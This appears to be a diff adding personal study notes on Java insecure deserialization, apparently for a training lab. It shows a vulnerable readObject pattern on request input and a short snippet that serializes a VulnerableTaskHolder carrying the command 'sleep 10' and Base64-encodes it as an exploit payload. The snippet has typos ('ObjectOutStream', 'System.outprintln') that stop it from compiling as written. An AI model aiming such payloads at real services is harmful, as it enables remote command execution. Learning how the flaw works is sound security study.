@@ -1,0 +1,22 @@
+Insecure Deserialization
+
+	InputStream is = request.getInputStream();
+	ObjectInputStream ois = new ObjectInputStream(is);
+
+	testClass test	= (testClass) ois.readObject();
+
+	It is trying to deserialize the ois stream and cast it to testClass
+
+	// readObject is like __wakeup() in php, it is called whenever a object of class is deserailized
+
+	// so the attacker needs to find a class that supports seriliazation and with dangerous implementations on readObject()
+
+
+	VulnerableTaskHolder test = new VulnerableTaskHolder("test","sleep 10");
+	ByteArrayOutputStream bos = new ByteArrayOutputStream();
+	ObjectOutStream oos = new ObjectOutputStream(bos);
+	oos.writeObject(test);
+	oos.flush();
+	
+	String exploit = Base64.getEncoder().encodeToString(bos.toByteArray());
+	System.outprintln(exploit);
